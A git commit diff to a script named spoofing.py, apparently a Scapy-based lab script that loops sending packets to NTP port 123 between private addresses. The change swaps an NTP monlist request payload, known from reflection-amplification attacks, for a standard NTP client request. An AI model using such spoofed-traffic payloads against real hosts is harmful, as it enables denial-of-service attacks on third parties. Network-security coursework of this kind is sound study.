76ac50eafa8aec6df93f62efeb4b3678c1cfb387
nubi12336 <syislu62823@kaist.ac.kr>
2021-04-09 23:19:11 +0900

    d

--- spoofing.py
+++ spoofing.py
@@ -5,7 +5,7 @@ A= "192.168.30.1"
 B= "192.168.20.1"
 C= RandShort()
 D= 123
-E= "\x17\x00\x03\x2a" + "\x00" * 4
+E= "\x1b\x00\x00\x00" + "\x00" * 44
 
 start = time.time()
 while (time.time() - start < 10):
